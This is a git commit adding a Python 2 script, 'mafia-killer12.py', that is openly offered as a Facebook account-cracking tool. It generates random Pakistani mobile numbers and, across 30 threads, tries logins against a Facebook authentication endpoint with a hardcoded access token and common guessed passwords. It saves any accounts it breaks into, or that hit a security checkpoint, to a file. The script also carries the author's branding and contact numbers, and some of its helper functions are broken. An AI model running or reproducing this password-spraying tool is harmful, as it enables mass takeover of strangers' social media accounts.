690722a025e0b2324cbac2e8419a3b86147d58ea
Mafia-Killer404 <72305102+Mafia-Killer404@users.noreply.github.com>
2020-10-06 19:36:44 +0500

    Add files via upload

---
+++ mafia-killer12.py
@@ -0,0 +1,391 @@
+#!/usr/bin/python2
+#coding=utf-8
+#BlackTiger-Error404
+#YouTube:Time4 You
+#Whatsapp+923037335114
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(10000):
+
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install mechanize')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install request')
+    time.sleep(1)
+    os.system('Then type: python2 Happy.py')
+
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def keluar():
+	print 'Thanks.'
+	os.sys.exit()
+
+def acak(b):
+    w = 'ahtdzjc'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+
+
+def cetak(b):
+    w = 'ahtdzjc'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
+    x += '\033[0m'
+    x = x.replace('!0','\033[0m')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(00000.1)
+def tik():
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\x1b[1;93mMAFIA-KILLER█████████████████▒▒▒▒▒▒▒▒..99% \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+
+
+back = 0
+oks = []
+id = []
+cpb = []
+vulnot = "\033[31mNot Vuln"
+vuln = "\033[32mVuln"
+
+os.system("clear")
+print  """
+\033[1;91m   _
+\033[1;92m  ( \                ..-----..__
+\033[1;93m   \.'.        _.--'`  [   '  ' ```'-._
+\033[1;94m    `. `'-..-'' `    '  ' '   .  ;   ; `-'''-.,__/|/_
+\033[1;95m      `'-.;..-''`|'  `.  '.    ;     '  `    '   `'  `,
+\033[1;96m                 \ '   .    ' .     '   ;   .`   . ' 7 \
+\033[1;97m                  '.' . '- . \    .`   .`  .   .\     `Y
+\033[1;91m                    '-.' .   ].  '   ,    '    /'`""';:'
+\033[1;92m                      /Y   '.] '-._ /    ' _.-'
+\033[1;93m                      \'\_   ; (`'.'.'  ."/
+\033[1;94m                       ' )` /  `.'   .-'.'
+\033[1;95m                        '\  \).'  .-'--"
+\033[1;96m                          `. `,_'`
+\033[1;97m                            `.__)  AsH/sk
+\033[1;96m▅▅▅▅▅▅▅▅๑۩∆(BlackTiger)∆۩๑▅▅▅▅▅▅
+\033[1;94mCreater➣\033[1;93mMAFIA-KILLER
+\033[1;94mWhatsapp☏ ➣\033[1;93m+923132197796
+\033[1;94mYoutube➣\033[1;93mTime4 You
+\033[1;94mBTiger➣Not A Name Its Brand \033[1;92mMAFIA-KILLER
+\033[1;94mNo Login Need➣Enjoy without any problem
+\033[1;95mBTiger Very Speed Script ➣Only add PAK Country code
+\033[1;96m▅▅▅▅▅▅▅▅▅๑۩∆(Error404)∆۩๑▅▅▅▅▅▅
+"""
+
+####Logo####
+
+logo1 = """
+\033[1;91m            _      _
+\033[1;92m           (c\-.--/a)
+\033[1;93m            |q: p   /\_            _____
+\033[1;94m          __\(_/  ).'  '---._.---'`     '---.__
+\033[1;95m         /  (Y_)_/             /        : \-._ \
+\033[1;96m !!!!,,, \_))'-';             (       _/   \  '\\_
+\033[1;97m!!II!!!!!IIII,, \_             \     /      \_  '.\
+\033[1;91m !IIsndIIIII!!!!,,\     /_      \   |----.___ '-. \'.__
+\033[1;92m !!!IIIIIIIIIIIIIIII\   | '--._.-'  _)       \  |  `'--'
+\033[1;93m     '''!!!!IIIIIII/   .',, ((___.-'         / /
+\033[1;94m           '''!!!!/  _/!!!!IIIIIII!!!!!,,,,,;,;,,,.....
+\033[1;95m                 | /IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+\033[1;96m                 | \   ''IIIIIIIIIIIIIIIIIIIIIIIIIIIIIIIII
+\033[1;97m                 \_,)     '''''!!!!IIIIIIIIIIIIIIII!!!!!!!!
+\033[1;97m                                   ''''''''''!!!!!!!!!!!!!!
+\033[1;96m▅▅▅▅▅▅▅▅๑۩∆(MAFIA-KILLER)∆۩๑▅▅▅▅▅▅
+\033[1;94mCreater➣\033[1;93mMAFIA-KILLER
+\033[1;94mWhatsapp☏ ➣\033[1;93m+92132197796
+\033[1;94mYoutube➣\033[1;93mMAFIA-KILLER
+\033[1;94mBTiger➣Not A Name Its Brand \033[1;92mMAFIA-KILLER
+\033[1;94mNo Login Need➣Enjoy without any problem
+\033[1;95mMAFIA-KILLER Very Speed Script ➣Only add PAK Country code
+\033[1;96m▅▅▅▅▅▅▅▅▅๑۩∆(MAFIA-KILLER)∆۩๑▅▅▅▅▅▅
+"""
+logo2 = """
+\033[1;91m                    ,.
+\033[1;92m                  ,_> `.   ,';
+\033[1;93m              ,-`'      `'   '`'._
+\033[1;94m           ,,-) ---._   |   .---''`-),.
+\033[1;95m         ,'      `.  \  ;  /   _,'     `,
+\033[1;96m      ,--' ____       \   '  ,'    ___  `-,
+\033[1;97m     _>   /--. `-.              .-'.--\   \__
+\033[1;97m    '-,  (    `.  `.,`~ \~'-. ,' ,'    )    _\
+\033[1;96m    _<    \     \ ,'  ') )   `. /     /    <,.
+\033[1;95m ,-'   _,  \    ,'    ( /      `.    /        `-,
+\033[1;94m `-.,-'     `.,'       `         `.,'  `\    ,-'
+\033[1;93m  ,'       _  /   ,,,      ,,,     \     `-. `-._
+\033[1;92m /-,     ,'  ;   ' _ \    / _ `     ; `.     `(`-\
+\033[1;91m  /-,        ;    (o)      (o)      ;          `'`,
+\033[1;91m,~-'  ,-'    \     '        `      /     \      <_
+\033[1;92m/-. ,'        \                   /       \     ,-'
+\033[1;93m  '`,     ,'   `-/             \-' `.      `-. <
+\033[1;94m   /_    /      /   (_     _)   \    \          `,
+\033[1;95m     `-._;  ,' |  .::.`-.-' :..  |       `-.    _\
+\033[1;96m       _/       \  `:: ,^. :.:' / `.        \,-'
+\033[1;97m     '`.   ,-'  /`-..-'-.-`-..-'\            `-.
+\033[1;97m       >_ /     ;  (\/( ' )\/)  ;     `-.    _<
+\033[1;96m       ,-'      `.  \`-^^^-'/  ,'        \ _<
+\033[1;95m        `-,  ,'   `. `     ,'   `-.   <`'
+\033[1;94m          ')        `._.,,_.'        \ ,-'
+\033[1;93m           '._        '`'`'   \       <
+\033[1;92m              >   ,'       ,   `-.   <`'
+\033[1;91m
+\033[1;91m   ___ ____   ___ ____ ______ ____ ____  _____ __ __ _  _   
+\033[1;96m▅▅▅▅▅▅▅▅๑۩∆(MAFIA-KILLER)∆۩๑▅▅▅▅▅▅
+\033[1;94mCreater➣\033[1;93mMAFIA-KILLER
+\033[1;94mWhatsapp☏ ➣\033[1;93m+92132197796
+\033[1;94mYoutube➣\033[1;93mTime4 You
+\033[1;94mBTiger➣Not A Name Its Brand \033[1;92mMAFIA-KILLER
+\033[1;94mNo Login Need➣Enjoy without any problem
+\033[1;95mBTiger Very Speed Script ➣Only add PAK Country code
+\033[1;96m▅▅▅▅▅▅▅▅▅๑۩∆(MAFIA-KILLER)∆۩๑▅▅▅▅▅▅
+
+"""
+
+CorrectPasscode = "mafia-killer12"
+
+loop = 'true'
+while (loop == 'true'):
+    passcode = raw_input("\033[1;92m[?] \x1b[1;97mPASSWORD \x1b[1;97m: ")
+    if (passcode == CorrectPasscode):
+            print """
+            \033[1;92mWelcome MAFIA-KILLER
+                  """
+            loop = 'false'
+    else:
+            print "\033[1;91m☠️WRONG"
+            os.system('xdg-open https://www.youtube.com/channel/UCqAyAEOedaDlFVsZFravPp')
+
+##### LICENSE #####
+#=================#
+def lisensi():
+    os.system('clear')
+    login()
+####login#########
+def login():
+    os.system('clear')
+    print logo1
+    print "\033[1;93m[1]\x1b[1;94mStart cloning ( no login )"
+    time.sleep(0.05)
+    print '\x1b[1;93m[0]\033[1;94m Exit (Coming Soon)'
+    pilih_login()
+
+def pilih_login():
+    peak = raw_input("\n\033[1;95mCHOOSE: \033[1;95m")
+    if peak =="":
+        print "\x1b[1;95mFill In Correctly"
+        pilih_login()
+    elif peak =="1":
+        Zeek()
+def Zeek():
+    os.system('clear')
+    print logo1
+    print '\x1b[1;94m[1] BlackTiger Start Cracking'
+    time.sleep(0.05)
+    print '\x1b[1;94m[0] \033[1;93m Back'
+    time.sleep(0.05)
+    action()
+
+def action():
+    peak = raw_input('\n\033[1;95mCHOOSE:\033[1;97m')
+    if peak =='':
+        print '[!] Fill In Correctly'
+        action()
+    elif peak =="1":              
+        os.system("clear")
+        print logo2
+        print "Enter any Pakistani Mobile code Number"+'\n'
+        print 'BlackTiger Enter any code 1 to 49'
+        try:
+            c = raw_input("\033[1;96mCHOOSE : ")
+            k="03"
+            idlist = ('.txt')
+            for line in open(idlist,"r").readlines():
+                id.append(line.strip())
+        except IOError:
+            print ("[!] File Not Found")
+            raw_input("\n[ Back ]")
+            blackmafiax()
+    elif peak =='0':
+        login()
+    else:
+        print '[!] Fill In Correctly'
+        action()
+    print 50* '\033[1;91m-'
+    xxx = str(len(id))
+    jalan ('\033[1;91m Total ids number: '+xxx)
+    jalan ('\033[1;92mCode you choose: '+c)
+    jalan ("\033[1;92mMAFIA-KILLER██████▒▒▒..99%Start Cracking...")
+    jalan ("\033[1;92mTo Stop Process Press Ctrl+z")
+    print 50* '\033[1;91m-'
+    def main(arg):
+        global cpb,oks
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass1                                       
+                okb = open('save/cloned.txt', 'a')
+                okb.write(k+c+user+pass1+'\n')
+                okb.close()
+                oks.append(c+user+pass1)
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass1
+                    cps = open('save/cloned.txt', 'a')
+                    cps.write(k+c+user+pass1+'\n')
+                    cps.close()
+                    cpb.append(c+user+pass1)
+                else:
+                    pass2 = k + c + user
+                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;92m(OK)  ' + k + c + user +  '  |  ' + pass2
+                        okb = open('save/cloned.txt', 'a')
+                        okb.write(k+c+user+pass2+'\n')
+                        okb.close()
+                        oks.append(c+user+pass2)
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass2
+                            cps = open('save/cloned.txt', 'a')
+                            cps.write(k+c+user+pass2+'\n')
+                            cps.close()
+                            cpb.append(c+user+pass2)
+                        else:
+                            pass3="123456"
+                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                            q = json.load(data)
+                            if 'access_token' in q:
+                                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass3
+                                okb = open('save/cloned.txt', 'a')
+                                okb.write(k+c+user+pass3+'\n')
+                                okb.close()
+                                oks.append(c+user+pass3)
+                            else:
+                                if 'www.facebook.com' in q['error_msg']:
+                                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass3 
+                                    cps = open('save/cloned.txt', 'a')
+                                    cps.write(k+c+user+pass3+'\n')
+                                    cps.close()
+                                    cpb.append(c+user+pass3)
+                                else:
+                                    pass4="Pakistan"
+                                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                    q = json.load(data)
+                                    if 'access_token' in q:
+                                        print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass4 
+                                        okb = open('save/cloned.txt', 'a')
+                                        okb.write(k+c+user+pass4+'\n')
+                                        okb.close()
+                                        oks.append(c+user+pass4)
+                                    else:
+                                        if 'www.facebook.com' in q['error_msg']:
+                                            print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass4
+                                            cps = open('save/cloned.txt', 'a')
+                                            cps.write(k+c+user+pass4+'\n')
+                                            cps.close()
+                                            cpb.append(c+user+pass4)
+                                        else:
+                                            pass5="786786"
+                                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+                                            q = json.load(data)
+                                            if 'access_token' in q:
+                                                print '\x1b[1;92m(OK)  ' + k + c + user + '  |  ' + pass5
+                                                okb = open('save/cloned.txt', 'a')
+                                                okb.write(k+c+user+pass5+'\n')
+                                                okb.close()
+                                                oks.append(c+user+pass5)
+                                            else:
+                                                if 'www.facebook.com' in q['error_msg']:
+                                                    print '\033[1;97m(CP) ' + k + c + user + '  |  ' + pass5 
+                                                    cps = open('save/cloned.txt', 'a')
+                                                    cps.write(k+c+user+pass5+'\n')
+                                                    cps.close()
+                                                    cpb.append(c+user+pass5)
+                                                                                                                                                                                                                
+                                                                                                                                                                                                                
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+                                                                                                                                                                                                            
+
+
+                                                                                                                                                                                                            
+                                                                                                                                                                                                                    
+                                                                                                                                                                                                            
+
+
+
+        except:
+            pass
+        
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50* '\033[1;91m-'
+    print 'MAFIA-KILLER Process Has Been Completed██████▒▒▒▒...100%'
+    print 'Total OK/CP : '+str(len(oks))+'/'+str(len(cpb))
+    print('MAFIA-KILLER Cloned Accounts Has Been Saved : save/cloned.txt')
+    jalan("Note : YOUR MAFIA-KILLER(CP)Accounts Open after 5 to 8 days")
+    print ''
+    print """
+    
+    
+    
+    
+
+\033[1;91mThanks \033[1;97mUSING MY MAFIA-KILLER TOOL
+\033[1;92m My Whatsapp No\033[1;97m+92132198796
+\033[1;93mGitHub\033[1;97MAFIA-KILLER
+\033[1;94YouTube\033[1;97m∆MAFIA-KILLER"""
+
+    
+    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
+    login() 
+          
+if __name__ == '__main__':
+    login()
+
+
+
